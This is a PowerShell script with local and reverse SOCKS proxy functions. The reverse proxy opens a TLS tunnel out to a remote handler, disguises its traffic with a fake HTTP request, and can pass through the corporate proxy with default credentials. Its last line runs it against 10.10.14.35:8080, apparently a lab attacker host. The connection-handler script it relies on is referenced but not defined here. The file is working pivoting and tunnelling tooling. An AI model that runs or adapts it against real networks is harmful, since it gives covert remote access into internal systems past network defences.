function Invoke-SocksProxy {
    param (
        [String]$bindIP = "0.0.0.0",
        [Int]$bindPort = 1080,
        [Int]$threads = 200
    )
    try {
        $listener = new-object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Parse($bindIP), $bindPort)
        $listener.start()
        $rsp = [runspacefactory]::CreateRunspacePool(1, $threads);
        $rsp.CleanupInterval = New-TimeSpan -Seconds 30;
        $rsp.open();
        write-host "Listening on port $bindPort..."
        while ($true) {
            $client = $listener.AcceptTcpClient()
            $cliStream = $client.GetStream()
            Write-Host "New Connection from " $client.Client.RemoteEndPoint
            $vars = [PSCustomObject]@{"cliConnection" = $client; "rsp" = $rsp; "cliStream" = $cliStream }
            $PS3 = [PowerShell]::Create()
            $PS3.RunspacePool = $rsp;
            $PS3.AddScript($SocksConnectionMgr).AddArgument($vars) | Out-Null
            $PS3.BeginInvoke() | Out-Null
            Write-Host "Threads Left:" $rsp.GetAvailableRunspaces()
        }
    }
    catch {
        throw $_
    }
    finally {
        write-host "Server closed."
        if ($listener -ne $null) {
            $listener.Stop()
        }
        if ($client -ne $null) {
            $client.Dispose()
            $client = $null
        }
        if ($PS3 -ne $null -and $AsyncJobResult3 -ne $null) {
            $PS3.EndInvoke($AsyncJobResult3) | Out-Null
            $PS3.Runspace.Close()
            $PS3.Dispose()
        }
    }
}

function getProxyConnection {
    param (
        [String]$remoteHost,
        [Int]$remotePort
    )
    #Sleep -Milliseconds 500
    $request = [System.Net.HttpWebRequest]::Create("http://" + $remoteHost + ":" + $remotePort ) 
    $request.Method = "CONNECT";
    $proxy = [System.Net.WebRequest]::GetSystemWebProxy();
    $proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
    $request.Proxy = $proxy;
    $request.timeout = 1000;
    $serverResponse = $request.GetResponse();
    $request.timeout = 100000;
    $responseStream = $serverResponse.GetResponseStream()
    $BindingFlags = [Reflection.BindingFlags] "NonPublic,Instance"
    $rsType = $responseStream.GetType()
    $connectionProperty = $rsType.GetProperty("Connection", $BindingFlags)
    $connection = $connectionProperty.GetValue($responseStream, $null)
    $connectionType = $connection.GetType()
    $networkStreamProperty = $connectionType.GetProperty("NetworkStream", $BindingFlags)
    $serverStream = $networkStreamProperty.GetValue($connection, $null)
    return $connection, $serverStream
}

function Invoke-ReverseSocksProxy {
    param (
 
        [String]$remoteHost = "127.0.0.1",
 
        [Int]$remotePort = 1080,

        [Switch]$useSystemProxy = $false,

        [String]$certFingerprint = "",

        [Int]$threads = 200,

        [Int]$maxRetries = 0

    )
    try {
        $currentTry = 0;
        $rsp = [runspacefactory]::CreateRunspacePool(1, $threads);
        $rsp.CleanupInterval = New-TimeSpan -Seconds 30;
        $rsp.open();
        while ($true) {
            Write-Host "Connecting to: " $remoteHost ":" $remotePort
            try {
                if ($useSystemProxy -eq $false) {
                    $client = New-Object System.Net.Sockets.TcpClient($remoteHost, $remotePort)
                    $cliStream_clear = $client.GetStream()
                }
                else {
                    $ret = getProxyConnection -remoteHost $remoteHost -remotePort $remotePort
                    $client = $ret[0]
                    $cliStream_clear = $ret[1]
                }
                if ($certFingerprint -eq '') {
                    $cliStream = New-Object System.Net.Security.SslStream($cliStream_clear, $false, ({ $true } -as [Net.Security.RemoteCertificateValidationCallback]));
                }
                else {
                    $cliStream = New-Object System.Net.Security.SslStream($cliStream_clear, $false, ({ return $args[1].GetCertHashString() -eq $certFingerprint } -as [Net.Security.RemoteCertificateValidationCallback]));
                }
                $cliStream.AuthenticateAsClient($remoteHost)
                Write-Host "Connected"
                $currentTry = 0;
                $buffer = New-Object System.Byte[] 32
                $buffer2 = New-Object System.Byte[] 122
                $FakeRequest = [System.Text.Encoding]::Default.GetBytes("GET / HTTP/1.1`nHost: " + $remoteHost + "`n`n")
                $cliStream.Write($FakeRequest, 0, $FakeRequest.Length)
                $cliStream.ReadTimeout = 5000
                $cliStream.Read($buffer2, 0, 122) | Out-Null
                $cliStream.Read($buffer, 0, 5) | Out-Null
                $message = [System.Text.Encoding]::ASCII.GetString($buffer)
                if ($message -ne "HELLO") {
                    throw "No Client connected";
                }
                else {
                    Write-Host "Connection received"
                }
                $cliStream.ReadTimeout = 100000;
                $vars = [PSCustomObject]@{"cliConnection" = $client; "rsp" = $rsp; "cliStream" = $cliStream }
                $PS3 = [PowerShell]::Create()
                $PS3.RunspacePool = $rsp;
                $PS3.AddScript($SocksConnectionMgr).AddArgument($vars) | Out-Null
                $PS3.BeginInvoke() | Out-Null
                Write-Host "Threads Left:" $rsp.GetAvailableRunspaces()
            }
            catch {
                $currentTry = $currentTry + 1;
                if (($maxRetries -ne 0) -and ($currentTry -eq $maxRetries)) {
                    Throw "Cannot connect to handler, max Number of attempts reached, exiting";
                }
                if ($_.Exception.message -eq 'Exception calling "AuthenticateAsClient" with "1" argument(s): "The remote certificate is invalid according to the validation procedure."') {
                    throw $_
                }
                if ($_.Exception.message -eq 'Exception calling "AuthenticateAsClient" with "1" argument(s): "Authentication failed because the remote party has closed the transport stream."') {
                    sleep 5
                }

                if (($_.Exception.Message.Length -ge 121) -and $_.Exception.Message.substring(0, 120) -eq 'Exception calling ".ctor" with "2" argument(s): "No connection could be made because the target machine actively refused') {
                    sleep 5
                }
                try {
                    $client.Close()
                    $client.Dispose()
                }
                catch {}
                sleep -Milliseconds 200
            }
        }
    }
    catch {
        throw $_;
    }
    finally {
        write-host "Server closed."
        if ($client -ne $null) {
            $client.Dispose()
            $client = $null
        }
        if ($PS3 -ne $null -and $AsyncJobResult3 -ne $null) {
            $PS3.EndInvoke($AsyncJobResult3) | Out-Null
            $PS3.Runspace.Close()
            $PS3.Dispose()
        }
    }
}

function Get-IpAddress {
    param($ip)
    IF ($ip -as [ipaddress]) {
        return $ip
    }
    else {
        $ip2 = [System.Net.Dns]::GetHostAddresses($ip)[0].IPAddressToString;
        Write-Host "$ip resolved to $ip2"
    }
    return $ip2
}
Invoke-ReverseSocksProxy -remotePort 8080 -remoteHost 10.10.14.35 -maxRetries 3 -certFingerprint '4C3C169E089E6652FCB08202B7F16653E806F12C'